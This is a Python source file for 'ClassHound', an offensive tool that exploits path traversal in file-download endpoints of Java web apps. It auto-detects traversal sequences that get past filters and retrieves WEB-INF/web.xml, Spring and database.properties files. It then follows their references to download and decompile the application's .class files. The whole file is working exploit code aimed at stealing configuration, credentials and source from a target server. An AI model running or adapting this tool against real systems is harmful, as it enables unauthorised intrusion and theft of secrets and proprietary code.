#!/usr/bin/env python
# coding: utf-8
# Build By LandGrey

import os
import io
import re
import sys
import time
import urllib3
import requests
import argparse
import subprocess
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter

try:
    from urllib import quote
    from urlparse import urlparse
    reload(sys)
    sys.setdefaultencoding('utf8')
    urllib3.disable_warnings()
except ImportError:
    from urllib.request import quote
    from urllib.request import urlparse


def request():
    global url, sleep_time, post_data, headers
    if sleep_time > 0:
        time.sleep(sleep_time)
    try:
        if not post_data:
            r = session.get(url, headers=headers, verify=False, timeout=30, allow_redirects=True)
        else:
            r = session.post(url, headers=headers, data=post_data, verify=False, timeout=30, allow_redirects=True)
        return r.status_code, r.content
    except requests.exceptions.ConnectionError as e:
        exit("[-] Request ConnectionError!")


def change_url_data(data):
    global url, post_data, delimiter, normal_path

    raw_file_path = delimiter + normal_path + delimiter
    if raw_post_data:
        post_data = raw_post_data.replace(raw_file_path, data)
    else:
        url = raw_url.replace(raw_file_path, data)


def change_travel_path(travel_file_path):
    global travel_char, travel_char_count

    change_url_data(travel_char * travel_char_count + travel_file_path)


def save_file(save_dir, file_name, content):
    # if file content is mess, you can play with it
    # content = content[4:-4]
    if content:
        file_name = file_name.replace('\\', '/').lstrip('/')
        dirs = file_name.split('/')[:-1]
        cur_dir = os.path.join(save_dir, "/".join(dirs))
        if not os.path.exists(cur_dir):
            os.makedirs(cur_dir)
        with open(os.path.join(cur_dir, file_name.split('/')[-1]), 'wb') as f:
            f.write(content)


def walk_file_paths(directory):
    file_paths = []
    for root_path, subdir_name, file_names in os.walk(directory):
        file_paths.extend([os.path.abspath(os.path.join(root_path, _)) for _ in file_names])
    return file_paths


def download_and_save_file(travel_file_path, auto_change_count=False):
    global normal_status_code, travel_char_count
    travel_file_path = travel_file_path.lstrip('/')

    pre_count = travel_char_count
    success = False

    change_travel_path(travel_file_path)
    _status_code, _content = request()

    if _content and _status_code == normal_status_code and keyword not in str(_content):
        try:
            save_file(own_dir, travel_file_path, _content)
            sys.stdout.write('\r[+] Download: [{}] ok{}'.format(travel_file_path, ' ' * 10))
            success = True
            travel_char_count = pre_count
        except Exception as e:
            sys.stdout.write('\r[-] Download: [{}] failed'.format(travel_file_path))
    else:
        sys.stdout.write('\r[-] Download: [{}] failed'.format(travel_file_path))
    sys.stdout.flush()

    # 没下载成功并使用 --auto 时
    if auto_change_count and not success:
        ranges = range(1, max_count)
        ranges.remove(travel_char_count)
        for r in ranges:
            travel_char_count = r
            change_travel_path(travel_file_path)
            _status_code, _content = request()
            if _content and _status_code == normal_status_code and keyword not in _content:
                try:
                    save_file(own_dir, travel_file_path, _content)
                    sys.stdout.write('\r[+] Download: [{}] ok !'.format(travel_file_path))
                    travel_char_count = r
                    break
                except Exception as e:
                    sys.stdout.write('\r[-] Download: [{}] failed !'.format(travel_file_path))
            else:
                sys.stdout.write('\r[-] Download: [{}] failed !'.format(travel_file_path))
            sys.stdout.flush()


def decompile_and_download_class(class_path):
    command = 'java -jar {} {}'.format(os.path.join(current_dir, 'thirdparty', 'cfr-0.145.jar'), class_path)
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    # 保存反编译的 class 文件
    save_file(own_dir, fp.replace('classes', 'java').replace('.class', '.java'), stdout)
    match = re.findall('import (.*?);', stdout.decode('utf-8'), re.I | re.M | re.S)
    if match:
        for m in match:
            _class_url_path = base_path + 'WEB-INF/classes/' + m.strip().replace(".", "/") + '.class'
            _allow_download = True
            for x in do_not_download_classes:
                if x in _class_url_path:
                    _allow_download = False
            if _allow_download and _class_url_path not in already_download_class_url_list:
                download_and_save_file(_class_url_path)
                already_download_class_url_list.append(_class_url_path)


def file_path_extract(value):
    values = []
    if ":" in value:
        for v in value.split(','):
            values.append(v.split(":")[-1])
    else:
        if ";" in value:
            values.extend(value.split(";"))
        else:
            values.extend(value.split())
    return values


def parse_xml_get_xml_url(xml_path):
    with io.open(xml_path, 'r', encoding="utf-8") as f:
        content = f.read()
        soup = BeautifulSoup(content, 'html.parser')
        values = []
        xml_urls = []
        # 解析全局 context-param 中 xml 文件路径
        for param in soup.find_all('context-param'):
            for child in param.find_all('param-value'):
                values.extend(file_path_extract(child.text))
        # 解析 servlet 中 xml 文件路径
        for servlet in soup.find_all('servlet'):
            servlet_name = servlet.find('servlet-name')
            for servlet_param in servlet.find_all('init-param'):
                param_value = servlet_param.find('param-value')
                if not param_value:
                    xml_urls.append(base_path + 'WEB-INF/{}-servlet.xml'.format(servlet_name))
                    xml_urls.append(base_path + 'WEB-INF/classes/{}-servlet.xml'.format(servlet_name))
                else:
                    values.extend(file_path_extract(param_value.text))
        # 模糊正则匹配其他情况
        matches = re.findall('<value>(.*?)</value>', content)
        if matches:
            for m in matches:
                values.extend(file_path_extract(m))
        for value in values:
            if not value.strip() or "*" in value:
                continue
            if "WEB-INF/" not in value.upper():
                xml_urls.append("WEB-INF/" + value.strip().lstrip('/'))
                xml_urls.append("WEB-INF/classes/" + value.strip().lstrip('/'))
            else:
                xml_urls.append(value.strip().lstrip('/'))

    xml_urls = list(set(xml_urls))
    return xml_urls


def match_and_download_xml(path):
    xml_urls = parse_xml_get_xml_url(path)
    for xml_url in xml_urls:
        for extension in do_download_extensions_from_xml:
            if xml_url.endswith(extension):
                download_and_save_file(xml_url)
                break


def disk_path_to_url_dir_path(disk_path):
    """
    :param disk_path:
    :return: /WEB-INF/config', '/WEB-INF/config/cache-context.xml
    """
    url_path = os.path.abspath(disk_path)[len(os.path.abspath(own_dir)):].replace('\\', '/')
    url_dir = os.path.split(url_path)[0]
    return url_dir, url_path


if __name__ == '__main__':
    start_time = time.time()
    print('''
                              _     _      |         
                  ,,,,,     o' \,=./ `o    |.===.    
                 /(o o)\       (o o)       {}o o{}   
              ooO--(_)--OooooO--(_)--OooooO--(_)--Ooo        
                                                            ClassHound v1.0\n
''')
    try:
        current_dir = os.path.dirname(os.path.join(os.path.abspath(sys.argv[0]))).encode('utf-8').decode()
    except UnicodeError:
        try:
            current_dir = os.path.dirname(os.path.abspath(sys.argv[0])).decode('utf-8')
        except UnicodeError:
            current_dir = "."
            exit('[*] Please play this script in ascii path')

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
        'Connection': 'Keep-Alive',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', dest='raw_url', default='', help='Full download url, file path must surrounded with delimiter char.\nSuch as: http://127.0.0.1/download.jsp?path=images/#1.png#')
    parser.add_argument('-k', '--keyword', dest='keyword', default='page not found', help='404 page keyword')
    parser.add_argument('-p', '--post', dest='raw_post_data', default='', help='POST data, file path must surrounded with delimiter char')
    parser.add_argument('-f', '--file', dest='url_file', default='', help='specify need download file url path list')
    parser.add_argument('-a', '--auto', dest='auto_change', default=False, action='store_true', help='auto detect and change travel char count when use -f options')
    parser.add_argument('-s', '--sleep-time', dest='sleep_time', default=0, type=float, help='sleep_time some seconds between two requests')
    parser.add_argument('-bp', '--base-path', dest='base_path', default='/', help='/WEB-INF folder prefix web path, default: "/".\nSuch as: change it to "opt/tomcat/webapps/"')
    parser.add_argument('-tc', '--travel-char', dest='travel_char', default='', help='specify travel char like ../')
    parser.add_argument('-cc', '--char-count', dest='travel_char_count', default=-1, type=int, help='travel char count number')
    parser.add_argument('-dc', '--delimiter-char', dest='delimiter_char', default='#', help='Delimiter char that surround file path , default: #')
    parser.add_argument('-hh', '--http-header', dest='http_header', default='', help='Add http request header, format: "Referer:http://127.0.0.1,admin:true"')
    parser.add_argument('-hp', '--http-proxy', dest='http_proxy', default=None, help='set http/https proxy')
    parser.add_argument('-mc', '--max-count', dest='max_count', default=8, type=int, help='max try travel char count, default: 10')

    if len(sys.argv) == 1:
        sys.argv.append('-h')
    args = parser.parse_args()

    raw_url = args.raw_url
    keyword = args.keyword
    auto = args.auto_change
    sleep_time = args.sleep_time
    max_count = args.max_count
    http_proxy = args.http_proxy
    download_path = args.url_file
    base_path = args.base_path
    travel_char = args.travel_char
    http_header = args.http_header
    delimiter = args.delimiter_char
    raw_post_data = args.raw_post_data
    travel_char_count = args.travel_char_count

    url = raw_url
    post_data = raw_post_data

    already_append_xml_disk_path_list = []
    not_parsed_disk_xml_path_list = []

    not_decompile_disk_class_path_list = []
    already_download_class_url_list = []
    already_download_class_disk_path_list = []

    do_download_extensions_from_xml = [
        '.xml',
        '.yml',
        '.yaml',
        '.factories',
        '.properties',
        '.cfg',
        '.conf',
        '.config',
        '.ini',
        '.json',
    ]
    do_not_download_classes = [
        '/qiniu/',
        '/javax/',
        '/qcloud/',
        '/hudson/',
        '/javafx/',
        '/jenkins/',
        '/kohsuke/',
        '/netscape/',
        '/jenkinsci/',
        '/freemarker/',

        '/java/io/',
        '/java/sql/',
        '/java/nio/',
        '/java/net/',
        '/java/awt/',
        '/java/rmi/',
        '/java/math/',
        '/java/time/',
        '/java/mail/',
        '/java/util/',
        '/java/lang/',
        '/java/text/',
        '/java/beans/',
        '/java/applet/',
        '/java/security/',

        '/cn/alanx/',
        '/cn/chinadoi/',

        '/net/sf/',
        '/net/coobird/',
        '/net/sourceforge/',

        '/sun/net/',
        '/jxl/write/',

        '/de/innosystec/',

        '/org/jcp/',
        '/org/omg/',
        '/org/w3c/',
        '/org/xml/',
        '/org/json/',
        '/org/jdom/',
        '/org/slf4j/',
        '/org/dom4j/',
        '/org/jfree/',
        '/org/tuckey/',
        '/org/quartz/',
        '/org/apache/',
        '/org/hibernate/',
        '/org/htmlparser/',
        '/org/aopalliance/',
        '/org/logicalcobwebs/',
        '/org/springframework/',

        '/com/sun/',
        '/com/octo/',
        '/com/jacob/',
        '/com/fredck/'
        '/com/oracle/',
        '/com/google/',
        '/com/alipay/',
        '/com/aliyun/',
        '/com/alibaba/',
        '/com/tencent/',
        '/com/aliyuncs/',
        '/com/baidubce/',
        '/com/microsoft/',
    ]

    hostname = urlparse(raw_url).hostname
    own_dir = os.path.join(current_dir, hostname)
    if not os.path.exists(own_dir):
        os.makedirs(own_dir)

    session = requests.Session()
    session.proxies = {'http': http_proxy, 'https': http_proxy}
    session.mount('http://', HTTPAdapter(max_retries=3))
    session.mount('https://', HTTPAdapter(max_retries=3))

    # 设置额外 HTTP headers
    if http_header:
        for header in http_header.split(","):
            header = header.strip()
            if header:
                kv = header.split(":")
                headers.update({kv[0].strip(): kv[-1].strip()})
    try:
        if raw_post_data:
            normal_path = re.findall(delimiter + '(.*?)' + delimiter, post_data)[0]
            post_data = raw_post_data.replace(delimiter, '')
        else:
            normal_path = re.findall(delimiter + '(.*?)' + delimiter, raw_url)[0]
            url = raw_url.replace(delimiter, '')
        if len(normal_path) == 0:
            exit('Invalid delimiter char {}, please changed!'.format(delimiter))
    except IndexError:
        normal_path = "fake path"
        exit('Cannot match valid file path in the middle of "{0} {0}"'.format(delimiter))
    # 获得正常下载请求的状态码和内容
    normal_status_code, normal_content = request()
    # 没指定遍历字符时自动探测遍历字符
    if not travel_char:
        travel_char = '../'
        # 正常文件名倒数第二位插入 ./ 探测目标是否会替换 ./ 为空字符
        change_url_data(normal_path[:-1] + './' + normal_path[-1])
        char_status_code, char_content = request()
        # 被替换
        if char_status_code == normal_status_code and char_content == normal_content:
            travel_char = '...//'
            # 正常文件名倒数第二位插入 ../ 探测目标是否会替换 ../ 为空字符
            change_url_data(normal_path[:-1] + '../' + normal_path[-1])
            char_status_code, char_content = request()
            # 被替换
            if char_status_code == normal_status_code and char_content == normal_content:
                travel_char = '.....///'
        else:
            # 正常文件名倒数第二位插入 ../ 探测目标是否会替换 ../ 为空字符
            change_url_data(normal_path[:-1] + '../' + normal_path[-1])
            char_status_code, char_content = request()
            # 被替换
            if char_status_code == normal_status_code and char_content == normal_content:
                travel_char = '....//'

    # 首次尝试下载的文件
    init_travel_files = [
        (base_path if base_path != "/" else "") + 'WEB-INF/web.xml',
        (base_path if base_path != "/" else "") + 'WEB-INF/config.xml',
        (base_path if base_path != "/" else "") + 'WEB-INF/spring-config.xml',
        (base_path if base_path != "/" else "") + 'WEB-INF/struts-config.xml',
        (base_path if base_path != "/" else "") + 'WEB-INF/applicationContext.xml',

        (base_path if base_path != "/" else "") + 'WEB-INF/classes/web.xml',
        (base_path if base_path != "/" else "") + 'WEB-INF/classes/spring-mvc.xml',
        (base_path if base_path != "/" else "") + 'WEB-INF/classes/spring-config.xml',

        (base_path if base_path != "/" else "") + 'WEB-INF/classes/spring/spring.xml',
        (base_path if base_path != "/" else "") + 'WEB-INF/classes/mybatis-config.xml',
        (base_path if base_path != "/" else "") + 'WEB-INF/classes/applicationContext.xml',
        (base_path if base_path != "/" else "") + 'WEB-INF/classes/mybatis/mybatis-config.xml',

        (base_path if base_path != "/" else "") + 'WEB-INF/spring.properties',
        (base_path if base_path != "/" else "") + 'WEB-INF/config.properties',
        (base_path if base_path != "/" else "") + 'WEB-INF/database.properties',

        (base_path if base_path != "/" else "") + 'WEB-INF/config/config.properties',
        (base_path if base_path != "/" else "") + 'WEB-INF/config/database.properties',
        (base_path if base_path != "/" else "") + 'WEB-INF/config/application.properties',

        (base_path if base_path != "/" else "") + 'WEB-INF/properties/database.properties',
        (base_path if base_path != "/" else "") + 'WEB-INF/properties/application.properties',

        (base_path if base_path != "/" else "") + 'WEB-INF/classes/app.properties',
        (base_path if base_path != "/" else "") + 'WEB-INF/classes/spring.properties',
        (base_path if base_path != "/" else "") + 'WEB-INF/classes/config.properties',
        (base_path if base_path != "/" else "") + 'WEB-INF/classes/database.properties',
        (base_path if base_path != "/" else "") + 'WEB-INF/classes/properties.properties',
        (base_path if base_path != "/" else "") + 'WEB-INF/classes/application.properties',
        (base_path if base_path != "/" else "") + 'WEB-INF/classes/META-INF/properties/database.properties',
    ]

    for travel_file in init_travel_files:
        # 手动指定遍历字符数量不再自动探测
        if travel_char_count != -1:
            change_url_data(travel_char * travel_char_count + travel_file)
            try_status_code, try_content = request()
            if try_content and try_status_code == normal_status_code and keyword not in str(try_content):
                save_file(own_dir, travel_file, try_content)
                print('\r[+] Download: [{}] success!  Travel Char: [{}]  Count: [{}]'.format(travel_file, travel_char, travel_char_count))
        else:
            for x in range(1, max_count + 1):
                change_url_data(travel_char * x + travel_file)
                try_status_code, try_content = request()
                if try_content and try_status_code == normal_status_code and keyword not in str(try_content):
                    travel_char_count = x if travel_char_count == 0 else travel_char_count
                    save_file(own_dir, travel_file, try_content)
                    print('\r[+] Download: [{}] success!  Travel Char: [{}]  Count: [{}]'.format(travel_file, travel_char, travel_char_count))
                    break
    try:
        # 指定了额外的下载文件列表
        if download_path:
            print("[+] Starting download from [{}] file ...".format(download_path))
            if os.path.isfile(download_path):
                with io.open(download_path, 'r', encoding="utf-8") as f:
                    for line in f.readlines():
                        if line.strip():
                            download_and_save_file(line.strip(), auto_change_count=True)
            else:
                exit("[-] File [{}] not exists".format(download_path))
        else:
            print("\r[+] Starting download [.xml] files ...")
            # 循环解析下载 xml 文件
            continue_xml_parse_and_download = True
            while True and continue_xml_parse_and_download:
                for fp in walk_file_paths(own_dir):
                    # 首先更新未解析 xml 路径列表
                    if fp in not_parsed_disk_xml_path_list:
                        not_parsed_disk_xml_path_list.remove(fp)
                    # 解析从未解析过的 xml 文件
                    if fp.endswith('.xml') and fp not in already_append_xml_disk_path_list:
                        match_and_download_xml(fp)
                        # 历史已解析 xml 列表
                        already_append_xml_disk_path_list.append(fp)
                        # 剩下的未解析 xml 列表
                        not_parsed_disk_xml_path_list.append(fp)
                # 如果本地 xml 文件全部都被解析过则退出循环
                if not not_parsed_disk_xml_path_list:
                    continue_xml_parse_and_download = False

            print("\r[+] Starting download [.class] files parsing from [.xml] files ...")
            # 粗粒度提取 xml 文件中 class 地址并尝试下载到本地
            class_pattern = '<.*?class>(.*?)</.*?class>|class="(.*?)"|type="(.*?)"|resource="(.*?)"'
            for fp in walk_file_paths(own_dir):
                if fp.endswith('.xml'):
                    try:
                        m = re.findall(class_pattern, io.open(fp, 'r', encoding="utf-8").read(), re.I | re.M | re.S)
                    except Exception as e:
                        m = re.findall(class_pattern, io.open(fp, 'r').read(), re.I | re.M | re.S)
                    if m:
                        for _m in m:
                            match_m = _m[0]
                            for x in range(0, len(_m)):
                                if _m[x]:
                                    match_m = _m[x]
                                    break
                            class_path_uri = match_m.replace(".", "/").strip()
                            class_url_path = base_path + 'WEB-INF/classes/' + class_path_uri + '.class'
                            allow_download = True
                            for x in do_not_download_classes:
                                if ('/' + class_path_uri).startswith(x):
                                    allow_download = False
                            if allow_download and class_url_path not in already_download_class_url_list:
                                download_and_save_file(class_url_path)
                                already_download_class_url_list.append(class_url_path)

            print("\r[+] Starting download [.class] files decompile from [.class] files ...")
            # 循环反编译 class 文件并下载到本地
            continue_class_parse_and_download = True
            while True and continue_class_parse_and_download:
                for fp in walk_file_paths(own_dir):
                    if fp in not_decompile_disk_class_path_list:
                        not_decompile_disk_class_path_list.remove(fp)
                    if fp.endswith('.class') and fp not in already_download_class_disk_path_list:
                        decompile_and_download_class(fp)
                        already_download_class_disk_path_list.append(fp)
                        not_decompile_disk_class_path_list.append(fp)
                # 如果本地 xml 文件全部都被解析过则退出循环
                if not not_decompile_disk_class_path_list:
                    continue_class_parse_and_download = False
    except KeyboardInterrupt:
        print("\n[*] User press CTR+C !")
    # 统计下最终下载的文件类型和数量
    fs = {}
    for fp in walk_file_paths(own_dir):
        fn = os.path.split(fp)[-1]
        if len(fn.split(".")) == 2:
            if fn.split(".")[-1]:
                if fn.split(".")[-1] in fs.keys():
                    fs[fn.split(".")[-1]] += 1
                else:
                    fs[fn.split(".")[-1]] = 1
        else:
            if 'other' in fs.keys():
                fs['other'] += 1
            else:
                fs['other'] = 1
    desc = ""
    for k, v in fs.items():
        desc += "\n[+] Download   {:10}  files : {}".format(k, v)
    print("\n\r[+] All cost   {:10}  seconds{}\n[+] result in: {}".format(str(time.time() - start_time)[:6], desc, own_dir))
